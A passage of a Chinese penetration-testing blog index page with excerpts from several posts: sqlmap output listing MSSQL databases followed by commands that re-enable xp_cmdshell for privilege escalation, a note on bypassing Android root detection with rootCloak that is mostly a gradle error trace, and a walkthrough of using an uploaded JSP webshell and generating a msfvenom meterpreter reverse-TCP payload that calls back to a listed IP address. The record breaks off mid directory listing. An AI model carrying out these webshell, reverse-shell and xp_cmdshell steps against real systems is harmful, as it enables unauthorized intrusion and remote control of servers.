<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">msdb</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">ReportServer</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">ReportServerTempDB</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">tempdb</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">ytems</span>

<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetched</span> <span class="nx">data</span> <span class="nx">logged</span> <span class="nx">to</span> <span class="nx">text</span> <span class="nx">files</span> <span class="nx">under</span> <span class="dl">'</span><span class="s1">/root/.sqlmap/output/underattack-host</span><span class="dl">'</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">shutting</span> <span class="nx">down</span> <span class="nx">at</span> <span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">35</span>
</code></pre></div></div>

<h1 id="提权">提权</h1>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dbcc</span> <span class="nx">addextendedproc</span> <span class="p">(</span><span class="dl">"</span><span class="s2">sp_oacreate</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">odsole70.dll</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">dbcc</span> <span class="nx">addextendedproc</span> <span class="p">(</span><span class="dl">"</span><span class="s2">xp_cmdshell</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">xplog70.dll</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>
<p>to be continued；</p>

          <p><a href="/blog/2020/wsdl/inject/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/escape/from_android_root/"><h3 class="ctitle">「安卓」:使用rootCloak绕过root权限监测</h3></a>
          <p><csmall>May 15, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>gradle打包
    <ul>
      <li>https://blog.csdn.net/EthanCo/article/details/52064044</li>
      <li>https://www.kutu66.com/GitHub/article_105897</li>
      <li>https://jingyan.baidu.com/article/c45ad29c20a123051753e2af.html</li>
    </ul>
  </li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="err">\</span><span class="nx">gradlew</span><span class="p">.</span><span class="nx">bat</span> <span class="nx">task</span>
<span class="nx">Active</span> <span class="nx">code</span> <span class="nx">page</span><span class="p">:</span> <span class="mi">65001</span>
<span class="nx">Failed</span> <span class="nx">to</span> <span class="nx">notify</span> <span class="nx">ProjectEvaluationListener</span><span class="p">.</span><span class="nx">afterEvaluate</span><span class="p">(),</span> <span class="nx">but</span> <span class="nx">primary</span> <span class="nx">configuration</span> <span class="nx">failure</span> <span class="nx">takes</span> <span class="nx">precedence</span><span class="p">.</span>
<span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">RuntimeException</span><span class="p">:</span> <span class="nx">SDK</span> <span class="nx">location</span> <span class="nx">not</span> <span class="nx">found</span><span class="p">.</span> <span class="nx">Define</span> <span class="nx">location</span> <span class="kd">with</span> <span class="nx">sdk</span><span class="p">.</span><span class="nx">dir</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">local</span><span class="p">.</span><span class="nx">properties</span> <span class="nx">file</span> <span class="nx">or</span> <span class="kd">with</span> <span class="nx">an</span> <span class="nx">ANDROID_HOME</span> <span class="nx">environment</span> <span class="nx">variable</span><span class="p">.</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">doBuildStages</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">122</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">access$200</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">32</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher$1</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">99</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher$1</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">93</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">internal</span><span class="p">.</span><span class="nx">progress</span><span class="p">.</span><span class="nx">DefaultBuildOperationExecutor</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">DefaultBuildOperationExecutor</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">90</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">internal</span><span class="p">.</span><span class="nx">progress</span><span class="p">.</span><span class="nx">DefaultBuildOperationExecutor</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">DefaultBuildOperationExecutor</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">62</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">doBuild</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">93</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">initialization</span><span class="p">.</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">DefaultGradleLauncher</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">82</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">InProcessBuildActionExecuter$DefaultBuildController</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">InProcessBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">94</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">tooling</span><span class="p">.</span><span class="nx">internal</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">ExecuteBuildActionRunner</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">ExecuteBuildActionRunner</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">28</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">ChainingBuildActionRunner</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">ChainingBuildActionRunner</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">35</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">InProcessBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">InProcessBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">43</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">InProcessBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">InProcessBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">28</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">ContinuousBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">ContinuousBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">78</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">ContinuousBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">ContinuousBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">48</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">DaemonUsageSuggestingBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">DaemonUsageSuggestingBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">51</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">exec</span><span class="p">.</span><span class="nx">DaemonUsageSuggestingBuildActionExecuter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">DaemonUsageSuggestingBuildActionExecuter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">28</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">RunBuildAction</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">RunBuildAction</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">43</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">internal</span><span class="p">.</span><span class="nx">Actions$RunnableActionAdapter</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">Actions</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">170</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">CommandLineActionFactory$ParseAndBuildAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">CommandLineActionFactory</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">237</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">CommandLineActionFactory$ParseAndBuildAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">CommandLineActionFactory</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">210</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">JavaRuntimeValidationAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">JavaRuntimeValidationAction</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">35</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">JavaRuntimeValidationAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">JavaRuntimeValidationAction</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">24</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">CommandLineActionFactory$WithLogging</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">CommandLineActionFactory</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">206</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">CommandLineActionFactory$WithLogging</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">CommandLineActionFactory</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">169</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">ExceptionReportingAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">ExceptionReportingAction</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">33</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">ExceptionReportingAction</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">ExceptionReportingAction</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">22</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">Main</span><span class="p">.</span><span class="nx">doAction</span><span class="p">(</span><span class="nx">Main</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">33</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">bootstrap</span><span class="p">.</span><span class="nx">EntryPoint</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">EntryPoint</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">45</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke0</span><span class="p">(</span><span class="nx">Native</span> <span class="nx">Method</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">62</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">DelegatingMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">DelegatingMethodAccessorImpl</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">43</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">Method</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">498</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">bootstrap</span><span class="p">.</span><span class="nx">ProcessBootstrap</span><span class="p">.</span><span class="nx">runNoExit</span><span class="p">(</span><span class="nx">ProcessBootstrap</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">54</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">bootstrap</span><span class="p">.</span><span class="nx">ProcessBootstrap</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">ProcessBootstrap</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">35</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">launcher</span><span class="p">.</span><span class="nx">GradleMain</span><span class="p">.</span><span class="nx">main</span><span class="p">(</span><span class="nx">GradleMain</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">23</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke0</span><span class="p">(</span><span class="nx">Native</span> <span class="nx">Method</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">NativeMethodAccessorImpl</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">62</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">DelegatingMethodAccessorImpl</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">DelegatingMethodAccessorImpl</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">43</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">Method</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">498</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">BootstrapMainStarter</span><span class="p">.</span><span class="nx">start</span><span class="p">(</span><span class="nx">BootstrapMainStarter</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">33</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">WrapperExecutor</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">WrapperExecutor</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">130</span><span class="p">)</span>
        <span class="nx">at</span> <span class="nx">org</span><span class="p">.</span><span class="nx">gradle</span><span class="p">.</span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">GradleWrapperMain</span><span class="p">.</span><span class="nx">main</span><span class="p">(</span><span class="nx">GradleWrapperMain</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">48</span><span class="p">)</span>

<span class="nx">FAILURE</span><span class="p">:</span> <span class="nx">Build</span> <span class="nx">failed</span> <span class="kd">with</span> <span class="nx">an</span> <span class="nx">exception</span><span class="p">.</span>
</code></pre></div></div>
<p>https://blog.csdn.net/coder_ken/article/details/50853927</p>

          <p><a href="/blog/2020/escape/from_android_root/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/docker/reverse/shell/by1/"><h3 class="ctitle">「渗透」:一句话反弹docker-shell</h3></a>
          <p><csmall>Apr 27, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <blockquote>
  <p>一句话木马反弹shell</p>
</blockquote>

<p>前提：现在情况是已经上传了一句话木马，可以执行命令如：ls,pwd,whoami等；问题在于，不管用<code class="language-plaintext highlighter-rouge">python</code>、<code class="language-plaintext highlighter-rouge">bash</code>还是<code class="language-plaintext highlighter-rouge">perl</code>都反弹不了，偷不了懒，就上msf把。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=pwd</span>
<span class="o">/</span><span class="nx">u01</span><span class="o">/</span><span class="nx">oracle</span><span class="o">/</span><span class="nx">user_projects</span><span class="o">/</span><span class="nx">domains</span><span class="o">/</span><span class="nx">base_domain</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=whoami</span>
<span class="nx">oracle</span>
</code></pre></div></div>

<h4 id="msf生成shell文件">msf生成shell文件</h4>
<p><code class="language-plaintext highlighter-rouge">msfvenom</code>先生成反弹shell文件，赋权。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">##</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">meterpreter_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1234</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">elf</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">elf</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Linux</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">or</span> <span class="nx">badchars</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">1046632</span> <span class="nx">bytes</span>
<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">elf</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">1046632</span> <span class="nx">bytes</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">##</span> <span class="nx">chmod</span> <span class="mi">777</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">elf</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=ls</span>
<span class="nx">测试一下一句话木马</span><span class="err">，</span><span class="nx">是可以执行命令的</span><span class="err">：</span>
<span class="nx">total</span> <span class="mi">1100</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span> <span class="mi">15</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">27</span> <span class="mi">08</span><span class="p">:</span><span class="mi">06</span> <span class="p">.</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="p">..</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">autodeploy</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">6</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">bin</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">common</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">9</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">24</span> <span class="nx">config</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">console</span><span class="o">-</span><span class="nx">ext</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">-----</span>  <span class="mi">1</span> <span class="nx">oracle</span> <span class="nx">oracle</span>     <span class="mi">234</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">derby</span><span class="p">.</span><span class="nx">log</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">-----</span>  <span class="mi">1</span> <span class="nx">oracle</span> <span class="nx">oracle</span>     <span class="mi">257</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">24</span> <span class="nx">edit</span><span class="p">.</span><span class="nx">lok</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">-----</span>  <span class="mi">1</span> <span class="nx">oracle</span> <span class="nx">oracle</span>     <span class="mi">327</span> <span class="nx">Jul</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="nx">fileRealm</span><span class="p">.</span><span class="nx">properties</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">init</span><span class="o">-</span><span class="nx">info</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">lib</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">nodemanager</span>
